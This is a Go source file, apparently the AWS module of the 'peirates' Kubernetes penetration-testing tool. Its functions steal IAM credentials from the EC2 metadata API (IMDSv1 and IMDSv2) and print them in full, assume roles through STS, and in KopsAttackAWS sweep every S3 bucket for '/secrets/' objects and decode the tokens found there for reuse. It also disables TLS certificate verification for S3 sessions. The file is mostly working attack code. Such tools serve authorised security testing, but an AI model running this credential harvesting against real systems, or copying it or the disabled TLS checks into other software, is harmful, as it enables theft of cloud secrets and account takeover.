package peirates

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/s3"
	"github.com/aws/aws-sdk-go/service/sts"
)

// AWSCredentials stores the credentials
type AWSCredentials struct {
	accountName string
	// InstanceProfileArn  string
	// If we parse this, we can freshen this only as necessary
	// Expiration			string `json:"Expiration"`
	AccessKeyId     string `json:"AccessKeyId"`
	SecretAccessKey string `json:"SecretAccessKey"`
	SessionToken    string `json:"Token"`
}

func PullIamCredentialsFromEnvironmentVariables() AWSCredentials {
	var credentials AWSCredentials

	credentials.AccessKeyId = os.Getenv("AWS_ACCESS_KEY_ID")
	credentials.SecretAccessKey = os.Getenv("AWS_SECRET_ACCESS_KEY")
	credentials.SessionToken = os.Getenv("AWS_SESSION_TOKEN")
	credentials.accountName = "AWS Credentials from Environment Variables"

	if len(credentials.AccessKeyId) > 0 {
		DisplayAWSIAMCredentials(credentials)
	}

	return credentials
}

func EnterIamCredentialsForAWS() (AWSCredentials, error) {

	var credentials AWSCredentials
	var component string

	var input string
	var err error

	component = "AccessKeyId"
	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
	_, error := fmt.Scanln(&input)
	if error != nil {
		println("[-] Unable to deal with input: %w", input)
		return credentials, errors.New("invalid " + input)
	}

	matched, error := regexp.MatchString(`\w{18,}`, input)
	if error != nil {
		fmt.Printf("Error matching string: %s\n", input)
	}

	if !matched {
		println("String entered isn't a " + component + "\n")
		return credentials, errors.New("invalid " + component)
	}

	credentials.AccessKeyId = strings.TrimSpace(strings.ToUpper(input))

	component = "SecretAccessKey"
	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
	_, err = fmt.Scanln(&input)
	if err != nil {
		return credentials, errors.New("invalid " + component)
	}
	matched, err = regexp.MatchString(`\w{18,}`, input)
	if err != nil {
		println("String entered isn't a " + component + "\n")
		return credentials, errors.New("invalid " + component)
	}
	credentials.SecretAccessKey = strings.TrimSpace(input)

	component = "session token"
	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
	_, err = fmt.Scanln(&input)
	if err != nil {
		return credentials, errors.New("invalid " + component)
	}
	matched, err = regexp.MatchString(`\w{5,}`, input)
	if err != nil {
		println("String entered isn't a " + component + "\n")
		return credentials, errors.New("Invalid " + component)
	}
	credentials.SessionToken = strings.TrimSpace(input)

	component = "name or comment"
	println("[+] Enter an AWS " + component + " or hit enter to exit: ")
	_, error = fmt.Scanln(&input)
	if error != nil {
		return credentials, errors.New("Invalid " + component)
	}
	matched, err = regexp.MatchString(`\w{1,}`, input)
	if err != nil {
		println("Name must include at least one alphanumeric character.\n")
		return credentials, errors.New("invalid " + component)
	}
	credentials.accountName = strings.TrimSpace(input)

	return credentials, nil
}

// PullIamCredentialsFromAWS requests access credentials from the AWS metadata API
func PullIamCredentialsFromAWS() (AWSCredentials, error) {

	var credentials AWSCredentials

	response, err := http.Get("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
	if err != nil {
		problem := "[-] Error - could not perform request http://169.254.169.254/latest/meta-data/iam/security-credentials/"
		println(problem)
		return credentials, errors.New(problem)
	}
	// Parse result as an account, then construct a request asking for that account's credentials
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	account := string(body)
	credentials.accountName = account

	request := "http://169.254.169.254/latest/meta-data/iam/security-credentials/" + account
	response2, err := http.Get(request)
	if err != nil {
		problem := "[-] Error - could not perform HTTP GET request : " + request
		println(problem)
		return credentials, errors.New(problem)
	}
	defer response2.Body.Close()
	body2, err := ioutil.ReadAll(response2.Body)

	err = json.Unmarshal(body2, &credentials)
	if err != nil {
		println("[-] Error - problem with JSON unmarshal")
	}
	return credentials, nil

}

func PullIamCredentialsFromAWSWithIMDSv2() (AWSCredentials, error) {

	var credentials AWSCredentials

	//  REQUEST 1: Get a token to interact with the Metadata API
	tokenURL := "http://169.254.169.254/latest/api/token"
	req, err := http.NewRequest("PUT", tokenURL, nil)
	if err != nil {
		fmt.Println("Error creating request for token:", err)
		return credentials, err
	}
	// Set necessary headers for token request
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600") // 6 hours

	// Send the request to get the token
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error fetching token:", err)
		return credentials, err
	}
	defer resp.Body.Close()

	// Use the token
	token, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading token:", err)
		return credentials, err
	}

	// println("DEBUG: Got IMDSv2 token: " + string(token))

	//  REQUEST 2: Get the account/role name
	accountURL := "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

	// Set up the request object
	req2, err := http.NewRequest("GET", accountURL, nil)
	if err != nil {
		fmt.Println("Error creating request for security credentials:", err)
		return credentials, err
	}
	// Attach the token to the new request
	req2.Header.Set("X-aws-ec2-metadata-token", string(token))
	// Send the request to get the security credentials
	resp, err = client.Do(req2)
	if err != nil {
		fmt.Println("Error fetching security credentials:", err)
		return credentials, err
	}
	defer resp.Body.Close()
	// Parse the response to get the account name
	accountName, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading security credentials:", err)
		return credentials, err
	}
	// fmt.Println("DEBUG: Role Name:", string(accountName))

	// REQUEST 3: Get the security credentials
	credURL := accountURL + string(accountName)
	// Set up the request object
	req3, err := http.NewRequest("GET", credURL, nil)
	if err != nil {
		fmt.Println("Error creating request for security credentials:", err)
		return credentials, err
	}
	// Attach the token to the new request
	req3.Header.Set("X-aws-ec2-metadata-token", string(token))
	// Send the request to get the security credentials
	resp, err = client.Do(req3)
	if err != nil {
		fmt.Println("Error fetching security credentials:", err)
		return credentials, err
	}
	defer resp.Body.Close()
	// Parse the response to get the account name
	temporaryCredentials, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading security credentials:", err)
		return credentials, err
	}
	// fmt.Println("DEBUG Credentials:", string(temporaryCredentials))

	// Parse result as an account, then construct a request asking for that account's credentials

	err = json.Unmarshal(temporaryCredentials, &credentials)
	if err != nil {
		println("[-] Error - problem with JSON unmarshal")
	}
	return credentials, nil

}

func AWSSTSAssumeRole(IAMCredentials AWSCredentials, roleToAssumeArn string) (AssumedCredentials AWSCredentials, err error) {

	matched, err := regexp.MatchString(`arn:aws:iam::\d{12,}:\w+\/\w+`, roleToAssumeArn)
	if !matched {
		return AssumedCredentials, errors.New("invalid role entered by user")
	}

	// Get region
	region, _, err := GetAWSRegionAndZone()
	if err != nil {
		println("ERR: Bailing on session because we could not get region.")
		return IAMCredentials, errors.New("could not get region")
	}

	// Start a session
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(IAMCredentials.AccessKeyId, IAMCredentials.SecretAccessKey, IAMCredentials.SessionToken),
	})

	if err != nil {
		fmt.Println("NewSession Error", err)
		return IAMCredentials, errors.New("could not start an STS session for assume-role")
	}

	// Create a STS client
	svc := sts.New(sess)

	sessionName := "sts_session"
	result, err := svc.AssumeRole(&sts.AssumeRoleInput{
		RoleArn:         &roleToAssumeArn,
		RoleSessionName: &sessionName,
	})

	if err != nil {
		fmt.Println("AssumeRole Error", err)
		return IAMCredentials, errors.New("assume role failed")

	}

	fmt.Println(result.AssumedRoleUser)
	fmt.Println(result.Credentials)

	// var AssumedCredentials AWSCredentials
	AssumedCredentials.AccessKeyId = *result.Credentials.AccessKeyId
	AssumedCredentials.SecretAccessKey = *result.Credentials.SecretAccessKey
	AssumedCredentials.SessionToken = *result.Credentials.SessionToken
	AssumedCredentials.accountName = roleToAssumeArn

	// Eventually, AWSCredentials should integrate expiration
	// AssumedCredentials.Expiration = *result.Credentials.Expiration

	return AssumedCredentials, nil
}

// DisplayAWSIAMCredentials prints the IAM credentials gathered out to stdout.
func DisplayAWSIAMCredentials(IAMCredentials AWSCredentials) {
	println("IAM Credentials for user " + IAMCredentials.accountName + " are: \n")
	println("aws_access_key_id = " + IAMCredentials.AccessKeyId)
	println("aws_secret_access_key = " + IAMCredentials.SecretAccessKey)
	println("aws_session_token = " + IAMCredentials.SessionToken)
}

func GetAWSRegionAndZone() (region string, zone string, err error) {

	url := "http://169.254.169.254/latest/meta-data/placement/availability-zone"
	response, err := http.Get(url)
	if err != nil {
		println("[-] Error - could not perform request " + url + "\n")
		return "", "", errors.New("Could not pull url " + url)
	}
	// Parse result as a region.
	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)
	zone = string(body)

	// Strip the last character off the region to get the zone.
	if len(zone) < 2 {
		return "", "", errors.New("Returned zone " + zone + " is not valid.")
	}
	region = zone[0 : len(zone)-1]

	return region, zone, nil

}

// StartS3Session creates a session with S3 using AWS Credentials.
func StartS3Session(IAMCredentials AWSCredentials) *s3.S3 {

	println("Starting a new session using AWS creds: ")
	DisplayAWSIAMCredentials(IAMCredentials)

	// Use the metadata API to determine our zone, then derive our region.
	region, _, err := GetAWSRegionAndZone()
	if err != nil {
		println("ERR: StartS3Session - Bailing on session because we could not get region.")
		return nil
	}
	println("Using region " + region)

	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(IAMCredentials.AccessKeyId, IAMCredentials.SecretAccessKey, IAMCredentials.SessionToken),
	})

	if err != nil {
		println("Couldn't create session")
		// return

	}
	// Deactivate TLS certificate verification, since the pod we run in may not have
	// a global CA store.
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	// Create S3 service client
	svc := s3.New(sess, &aws.Config{
		HTTPClient: client,
	})
	return svc
}

// ListBucketObjects lists the objects in a specific bucket
func ListBucketObjects(IAMCredentials AWSCredentials, bucket string) error {

	svc := StartS3Session(IAMCredentials)
	// Get the list of items
	resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
	if err != nil {
		nonexitErrorf("Unable to list items in bucket %q, %v", bucket, err)
		return nil
	}

	for _, item := range resp.Contents {
		fmt.Println("Name:         ", *item.Key)
		fmt.Println(" | Last modified:", *item.LastModified)
		fmt.Println(" || Size:         ", *item.Size)
		fmt.Println(" ||| Storage class:", *item.StorageClass)
		fmt.Println("")
	}
	return nil
}

// ListBuckets lists the buckets accessible from this IAM account.
func ListAWSBuckets(IAMCredentials AWSCredentials) (bucketNamesList []string, err error) {
	// Initialize an S3 session in the current region.
	svc := StartS3Session(IAMCredentials)

	result, err := svc.ListBuckets(nil)
	if err != nil {
		nonexitErrorf("Unable to list buckets, %v", err)

		return bucketNamesList, err
	}

	for _, b := range result.Buckets {
		bucketName := aws.StringValue(b.Name)
		bucketNamesList = append(bucketNamesList, bucketName)
	}
	return bucketNamesList, nil
}

func nonexitErrorf(msg string, args ...interface{}) {

	fmt.Fprintf(os.Stderr, msg+"\n", args...)

}

func KopsAttackAWS(serviceAccounts *[]ServiceAccount, awsCredentials AWSCredentials, assumedAWSrole AWSCredentials, interactive bool) {

	var storeTokens string
	placeTokensInStore := false

	println("[1] Store all tokens found in Peirates data store")
	println("[2] Retrieve all tokens - I will copy and paste")
	_, err := fmt.Scanln(&storeTokens)
	if err != nil {
		println("[-] Error reading input")
		pauseToHitEnter(interactive)
		return
	}
	storeTokens = strings.TrimSpace(storeTokens)

	if storeTokens == "1" {
		placeTokensInStore = true
	}

	if placeTokensInStore {
		println("Saving tokens to store")
	}

	// Hit the metadata API only if AWS creds aren't loaded already.
	var credentialsToUse AWSCredentials
	if len(assumedAWSrole.AccessKeyId) > 0 {
		credentialsToUse = assumedAWSrole
	} else if len(awsCredentials.AccessKeyId) > 0 {
		credentialsToUse = awsCredentials
	} else {
		println("Pulling AWS credentials from the metadata API.")
		result, err := PullIamCredentialsFromAWS()
		if err != nil {
			println("[-] Could not get AWS credentials from metadata API.")
			pauseToHitEnter(interactive)
			return
		}
		println("[+] Got AWS credentials from metadata API.")
		awsCredentials = result
		credentialsToUse = awsCredentials
	}

	println("[+] Preparing to use this AWS account to list and search S3 buckets: " + awsCredentials.AccessKeyId)

	result, err := ListAWSBuckets(credentialsToUse)
	if err != nil {
		println("Could not list buckets")
		pauseToHitEnter(interactive)
		return
	}
	listOfBuckets := result

	// Start a single S3 session
	svc := StartS3Session(credentialsToUse)

	// Look in every bucket for an oject that has a subdirectory called "secrets" in it.
	for _, bucket := range listOfBuckets {
		println("\n\n=============================================\n\n")
		println("Listing items in bucket " + bucket)

		// Get the list of items
		resp, err := svc.ListObjectsV2(&s3.ListObjectsV2Input{Bucket: aws.String(bucket)})
		if err != nil {
			println("Unable to list items in bucket %q, %v", bucket, err)
			pauseToHitEnter(interactive)
			return
		}

		for _, item := range resp.Contents {

			if strings.Contains(*item.Key, "/secrets/") {
				fmt.Println("Investigating bucket object for tokens:  " + *item.Key)

				result, error := svc.GetObject(&s3.GetObjectInput{
					Bucket: aws.String(bucket),
					Key:    aws.String(*item.Key),
				})

				if error != nil {
					continue
				}

				buf := new(bytes.Buffer)
				_, err = buf.ReadFrom(result.Body)
				jsonOutput := buf.String()
				byteEncodedJsonOutput := []byte(jsonOutput)
				// Unmarshall the json into Data : encodedtoken

				var structuredVersion AWSS3BucketObject

				error = json.Unmarshal(byteEncodedJsonOutput, &structuredVersion)
				if error != nil {
					continue
				}
				encodedToken := structuredVersion.Data
				println("Encoded token: " + encodedToken)
				token, err := base64.StdEncoding.DecodeString(encodedToken)
				if err != nil {
					println("[-] Could not decode token.")
					pauseToHitEnter(interactive)
					return
				} else {
					tokenString := string(token)
					println(tokenString)

					if placeTokensInStore {
						tokenName := "AWS-acquired: " + string(*item.Key)
						println("[+] Storing token as:", tokenName)
						AddNewServiceAccount(tokenName, tokenString, "AWS Bucket", serviceAccounts)
					}
				}

			}

		}
	}
	return

}

func awsS3ListBucketsMenu(awsCredentials AWSCredentials, assumedAWSrole AWSCredentials) {

	var credentialsToUse AWSCredentials
	if len(assumedAWSrole.AccessKeyId) > 0 {
		credentialsToUse = assumedAWSrole
	} else if len(awsCredentials.AccessKeyId) > 0 {
		credentialsToUse = awsCredentials
	} else {
		println("Pulling AWS credentials from the metadata API.")
		result, err := PullIamCredentialsFromAWS()
		if err != nil {
			println("[-] Did not work with IMDSv1, trying IMDSv2.")
			result, err = PullIamCredentialsFromAWSWithIMDSv2()
			if err != nil {
				println("[-] Could not get AWS credentials from metadata API.")
				return
			}
		}
		println("[+] Got AWS credentials from metadata API.")
		awsCredentials = result
		credentialsToUse = awsCredentials
	}

	result, err := ListAWSBuckets(credentialsToUse)
	if err != nil {
		println("List bucket operation failed.")
		return
	}

	for _, bucket := range result {
		println(bucket)
	}

}

func awsS3ListBucketObjectsMenu(awsCredentials AWSCredentials, assumedAWSrole AWSCredentials) {

	var bucket string

	println("Enter a bucket name to list: ")
	_, err := fmt.Scanln(&bucket)
	if err != nil {
		println("[-] Error reading input")
		return
	}

	// Altering this to allow self-entered credentials.
	// var IAMCredentials = PullIamCredentialsFromAWS()
	if len(assumedAWSrole.AccessKeyId) > 0 {
		err = ListBucketObjects(assumedAWSrole, bucket)
	} else {
		err = ListBucketObjects(awsCredentials, bucket)
	}

	if err != nil {
		println("[-] Error listing bucket objects.")
	}
}

func getAWSToken(interactive bool) (awsCredentials AWSCredentials, err error) {

	// Pull IAM credentials from the Metadata API, store in a struct and display

	awsCredentials, err = PullIamCredentialsFromAWS()
	if err != nil {
		println("[-] Operation failed.")
		return awsCredentials, err
	}

	DisplayAWSIAMCredentials(awsCredentials)
	return awsCredentials, nil
}

func assumeAWSrole(awsCredentials AWSCredentials, assumedAWSrole *AWSCredentials, interactive bool) {

	// Get role to assume
	var input string
	println("[+] Enter a role to assume, in the format arn:aws:iam::123456789012:role/roleName : ")
	_, err := fmt.Scanln(&input)

	iamArnValidationPattern := regexp.MustCompile(`arn:aws:iam::\d{12,}:\w+\/\w+`)
	if !iamArnValidationPattern.MatchString(input) {
		println("String entered isn't a AWS role name in the format requested.\n")
		pauseToHitEnter(interactive)
		return
	}
	roleToAssume := strings.TrimSpace(input)

	// Attempt to assume role.
	roleAssumption, err := AWSSTSAssumeRole(awsCredentials, roleToAssume)
	if err != nil {
		pauseToHitEnter(interactive)
		return
	}

	*assumedAWSrole = roleAssumption
}
